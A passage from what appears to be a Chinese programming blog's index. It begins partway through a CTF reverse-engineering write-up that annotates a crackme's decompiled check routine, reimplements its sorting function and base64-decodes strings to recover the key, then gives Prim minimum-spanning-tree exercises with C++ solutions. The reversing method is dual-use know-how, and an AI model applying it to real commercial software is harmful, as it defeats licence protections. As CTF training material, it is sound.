class="hljs-comment">&#x27;U&#x27;</span><br>        &amp;&amp; String[<span class="hljs-number">1</span>] == v7[<span class="hljs-number">4</span>]                   // string[<span class="hljs-number">1</span>] = <span class="hljs-comment">&#x27;J&#x27;</span><br>        &amp;&amp; <span class="hljs-number">4</span> * String[<span class="hljs-number">2</span>] - <span class="hljs-number">141</span> == <span class="hljs-number">3</span> * v7[<span class="hljs-number">2</span>]     // string[<span class="hljs-number">2</span>] = <span class="hljs-comment">&#x27;W&#x27;</span><br>        &amp;&amp; String[<span class="hljs-number">3</span>] / <span class="hljs-number">4</span> == <span class="hljs-number">2</span> * (v7[<span class="hljs-number">7</span>] / <span class="hljs-number">9</span>)     // string[<span class="hljs-number">3</span>] = <span class="hljs-comment">&#x27;P&#x27;</span><br>        &amp;&amp; !strcmp(v4, <span class="hljs-string">&quot;ak1w&quot;</span>)                  // v4 = <span class="hljs-string">&quot;ak1w&quot;</span><br>        &amp;&amp; !strcmp(<br>              v5,                               // v5 = <span class="hljs-string">&quot;V1Ax&quot;</span><br>              <span class="hljs-string">&quot;V1Ax&quot;</span>) )<br>      &#123;<br>        MessageBoxA(hDlg, <span class="hljs-string">&quot;U g3t 1T!&quot;</span>, <span class="hljs-string">&quot;@_@&quot;</span>, <span class="hljs-number">0</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( a3 != <span class="hljs-number">1</span> &amp;&amp; a3 != <span class="hljs-number">2</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  EndDialog(hDlg, a3);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中sub_4010F0函数参数已知，可以直接求出其处理结果</p><p>转换为C语言脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// a1 为  v7对应地址</span><br><span class="hljs-comment">// a2 = 0</span><br><span class="hljs-comment">// a3 = 10</span><br><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">sub_4010F0</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// edx</span><br><br>  result = a3;                                  <span class="hljs-comment">// result = 10</span><br>  <span class="hljs-keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )               <span class="hljs-comment">// i=0;i&lt;=10;a2=i</span><br>  &#123;<br>    v5 = i;<br>    v6 = a1[i];                                 <span class="hljs-comment">// 遍历a1对应地址的元素</span><br>    <span class="hljs-keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )            <span class="hljs-comment">// a2&lt;10  并且 i&lt;10</span><br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; a1[result] )                  <span class="hljs-comment">// 如果a1[i] &gt; a1[result]</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;                              <span class="hljs-comment">// 如果i&gt;=result则退出循环</span><br>          ++i;                                  <span class="hljs-comment">// 给i+1</span><br>          a1[v5] = a1[result];                  <span class="hljs-comment">// 让a1[1] = a1[result]</span><br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;                              <span class="hljs-comment">// 如果i&gt;=result则退出循环           重复</span><br>          <span class="hljs-keyword">while</span> ( a1[i] &lt;= v6 )                 <span class="hljs-comment">// 当a1[i] &lt;= v6           此循环一定成立</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> ( ++i &gt;= result )                <span class="hljs-comment">// 如果i = result - 1</span><br>              <span class="hljs-keyword">goto</span> LABEL_13;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            <span class="hljs-keyword">break</span>;<br>          v5 = i;<br>          a1[result] = a1[i];<br>        &#125;<br>        --result;                               <span class="hljs-comment">// result减一</span><br>      &#125;<br>      <span class="hljs-keyword">while</span> ( i &lt; result );<br>    &#125;<br>LABEL_13:<br>    a1[result] = v6;                            <span class="hljs-comment">// 让a1[result] = 之前的a1[i]</span><br>    <span class="hljs-built_in">sub_4010F0</span>(a1, a2, i - <span class="hljs-number">1</span>);                  <span class="hljs-comment">// 进行递归……</span><br>    result = a3;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> v7[<span class="hljs-number">11</span>]=&#123;<span class="hljs-number">90</span>,<span class="hljs-number">74</span>,<span class="hljs-number">83</span>,<span class="hljs-number">69</span>,<span class="hljs-number">67</span>,<span class="hljs-number">97</span>,<span class="hljs-number">78</span>,<span class="hljs-number">72</span>,<span class="hljs-number">51</span>,<span class="hljs-number">110</span>,<span class="hljs-number">103</span>&#125;;<br><span class="hljs-built_in">sub_4010F0</span>(v7,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">11</span>;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c &quot;</span>, v7[i]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到如下结果</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span>C E H J N S Z a g n<br></code></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs basic">// a1 为  v7对应地址<br>// a2 = <span class="hljs-number">0</span><br>// a3 = <span class="hljs-number">10</span><br><span class="hljs-keyword">int</span> __cdecl sub_4010F0(<span class="hljs-keyword">int</span> *a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)<br>&#123;<br>  <span class="hljs-keyword">int</span> result; // eax<br>  <span class="hljs-keyword">int</span> i; // esi<br>  <span class="hljs-keyword">int</span> v5; // ecx<br>  <span class="hljs-keyword">int</span> v6; // edx<br><br>  result = a3;                                  // result = <span class="hljs-number">10</span><br>  <span class="hljs-keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )               // i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;a2=i<br>  &#123;<br>    v5 = i;<br>    v6 = a1[i];                                 // 遍历a1对应地址的元素<br>    <span class="hljs-keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )            // a2&lt;<span class="hljs-number">10</span>  并且 i&lt;<span class="hljs-number">10</span><br>    &#123;<br>      do<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v6 &gt; a1[result] )                  // 如果a1[i] &gt; a1[result]<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            break;                              // 如果i&gt;=result则退出循环<br>          ++i;                                  // 给i+<span class="hljs-number">1</span><br>          a1[v5] = a1[result];                  // 让a1[<span class="hljs-number">1</span>] = a1[result]<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            break;                              // 如果i&gt;=result则退出循环           重复<br>          <span class="hljs-keyword">while</span> ( a1[i] &lt;= v6 )                 // 当a1[i] &lt;= v6           此循环一定成立<br>          &#123;<br>            <span class="hljs-keyword">if</span> ( ++i &gt;= result )                // 如果i = result - <span class="hljs-number">1</span><br>              <span class="hljs-keyword">goto</span> LABEL_13;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( i &gt;= result )<br>            break;<br>          v5 = i;<br>          a1[result] = a1[i];<br>        &#125;<br>        --result;                               // result减一<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( i &lt; result );<br>    &#125;<br>LABEL_13:<br>    a1[result] = v6;                            // 让a1[result] = 之前的a1[i]<br>    sub_4010F0(a1, a2, i - <span class="hljs-number">1</span>);                  // 进行递归……<br>    result = a3;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>对两个比较的字符串分别进行base64解密（byte内有明显的base64加密提示）</p><p>开头两个字符分别对应的是’3’+34后的字’U’，和对应栈内v7[4]&#x3D;’J’</p><p>得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">UJWP1jMp<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> BUU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFUOJ-最小树-Prim算法</title>
      <link href="/2020/12/d6807259.html"/>
      <url>/2020/12/d6807259.html</url>
      
        <content type="html"><![CDATA[<h1 id="最小树1"><a href="#最小树1" class="headerlink" title="最小树1"></a>最小树1</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">某省长调查交通情况，发现本省交通事故发生不断，于是决定在本省内全部修建地铁。<br>该省长得到的统计表中列出了任意两市之间的距离，为了确保任何两个市都可以直接<br>或者间接实现地铁交通，并要求铺设的地铁总长度最小，请计算最小的地铁总长度。<br></code></pre></td></tr></table></figure><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">测试输入包含若干测试用例。每个测试用例的第一行给出市的数目<span class="hljs-built_in">n</span>,（<span class="hljs-built_in">n</span> &amp;lt; <span class="hljs-number">50</span>);随后的<br><span class="hljs-built_in">n</span>(<span class="hljs-comment">n-1</span>)/<span class="hljs-number">2</span>行对应市之间的距离，每行给出一对正整数，分别是两个市的编号，以及两<br>市之间的距离。为简单起见，市从<span class="hljs-number">1</span>到<span class="hljs-built_in">n</span>编号，当<span class="hljs-built_in">n</span>为<span class="hljs-number">0</span>时，输入结束，该样例不做处理。<br></code></pre></td></tr></table></figure><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">对每个测试用例，在一行里输出最小的地铁总长度，保留两位小数。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">1.8</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">2.9</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4.5</span><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.<span class="hljs-number">70</span><br></code></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF = <span class="hljs-number">99999999</span>;<br><br><span class="hljs-type">double</span> mp[<span class="hljs-number">60</span>][<span class="hljs-number">60</span>],dis[<span class="hljs-number">60</span>];<br><span class="hljs-type">int</span> vis[<span class="hljs-number">60</span>];<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">double</span> mi,sum=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span> ,<span class="hljs-built_in">sizeof</span>(vis));<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br>dis[i]=mp[<span class="hljs-number">1</span>][i];<br>&#125;<br>vis[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>&#123;<br>mi=INF;<br><span class="hljs-type">int</span> pos;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(!vis[j]&amp;&amp;dis[j]&lt;mi)<br>&#123;<br>mi=dis[j];<br>pos=j;<br>&#125;<br>&#125;<br>vis[pos]=<span class="hljs-number">1</span>;<br>sum+=mi;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(!vis[j]&amp;&amp;dis[j]&gt;mp[pos][j])<br>dis[j]=mp[pos][j];<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,a,b;<br><span class="hljs-type">double</span> l;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n&amp;&amp;n)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n*(n<span class="hljs-number">-1</span>)/<span class="hljs-number">2</span>;i++)<br>&#123;<br>cin&gt;&gt;a&gt;&gt;b&gt;&gt;l;<br>mp[a][b]=mp[b][a]=l;<br>&#125;<br><span class="hljs-type">double</span> ans=<span class="hljs-built_in">find</span>(n);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2lf\n&quot;</span>, ans);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="最小树2"><a href="#最小树2" class="headerlink" title="最小树2"></a>最小树2</h1><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">在森林里住了n只小熊，他们分别叫小熊<span class="hljs-selector-tag">A</span>，小熊<span class="hljs-selector-tag">B</span>……，小熊们决定修建水泥路让他们能更加方便的往来，使得任何一只小熊都能轻松到达其他小熊的家，同时小熊们希望修建的水泥路最短。<br></code></pre></td></tr></table></figure><h3 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">测试输入若干实例，每个测试实例第一行给出小熊的数目n和小熊们能直接通往的m条道路，（n≤<span class="hljs-number">26</span>,m &amp;lt; <span class="hljs-number">100</span>)接下来m行，每行为两只小熊的名字（分别为<span class="hljs-selector-tag">A</span>,<span class="hljs-selector-tag">B</span>,C.........,若n为<span class="hljs-number">3</span>，则只会出现<span class="hljs-selector-tag">A</span>,<span class="hljs-selector-tag">B</span>,C,依次类推）以及这两只小熊之间的距离（为正整数）。<br></code></pre></td></tr></table></figure><h3 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">输出最短的水泥路的长度，若不能满足任何一只小熊到其他所有小熊的家，则输出-<span class="hljs-number">1</span>.<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">A</span> B <span class="hljs-number">1</span><br><span class="hljs-attribute">A</span> C <span class="hljs-number">2</span><br><span class="hljs-attribute">B</span> C <span class="hljs-number">4</span><br><span class="hljs-attribute">3</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">A</span> B <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff">3<br><span class="hljs-deletion">-1</span><br></code></pre></td></tr></table></figure><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF 0x3f3f3f3f</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> mp[<span class="hljs-number">30</span>][<span class="hljs-number">30</span>],dis[<span class="hljs-number">30</span>];<br><span class="hljs-type">int</span> vis[<span class="hljs-number">30</span>],n;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(i==j)mp[i][j]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">else</span><br>mp[i][j]=INF;<br>&#125;<br>&#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(vis));<br><span class="hljs-type">int</span> mi,pos,sum=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)dis[i]=mp[<span class="hljs-number">1</span>][i];<br>vis[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>&#123;<br>mi=INF;<br><span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(!vis[j]&amp;&amp;dis[j]&lt;mi)<br>&#123;<br>mi=dis[j];<br>pos=j;<br>flag=<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!flag)<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>sum+=mi;<br>vis[pos]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(!vis[j]&amp;&amp;dis[j]&gt;mp[pos][j])<br>&#123;<br>dis[j]=mp[pos][j];<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> m,l;<br>string a,b;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;m)<br>&#123;<br><span class="hljs-built_in">init</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>&#123;<br>cin&gt;&gt;a&gt;&gt;b&gt;&gt;l;<br><span class="hljs-type">int</span> x=a[<span class="hljs-number">0</span>]-<span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> y=b[<span class="hljs-number">0</span>]-<span class="hljs-string">&#x27;A&#x27;</span>+<span class="hljs-number">1</span>;<br>mp[x][y]=mp[y][x]=l;<br>&#125;<br><span class="hljs-type">int</span> ans=<span class="hljs-built_in">find</span>(n);<br>cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="最小树3"><a href="#最小树3" class="headerlink" title="最小树3"></a>最小树3</h1><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">有<span class="hljs-built_in">n</span>个站，求从<span class="hljs-number">1</span>站到<span class="hljs-built_in">n</span>站的最短路线。<br></code></pre></td></tr></table></figure><h3 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">输入第一行n和m,  n表示有n个站，m表示有m条道路，(n,m&amp;lt;<span class="hljs-number">100</span>)接下来m行每一行输入三个数<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>,d,表示<span class="hljs-selector-tag">a</span>和<span class="hljs-selector-tag">b</span>之间有一条长为d 的路。<br></code></pre></td></tr></table></figure><h3 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">输出从<span class="hljs-number">1</span>到<span class="hljs-built_in">n</span>的最短距离。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">4</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">5</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">5</span> <span class="hljs-number">1</span> <br><span 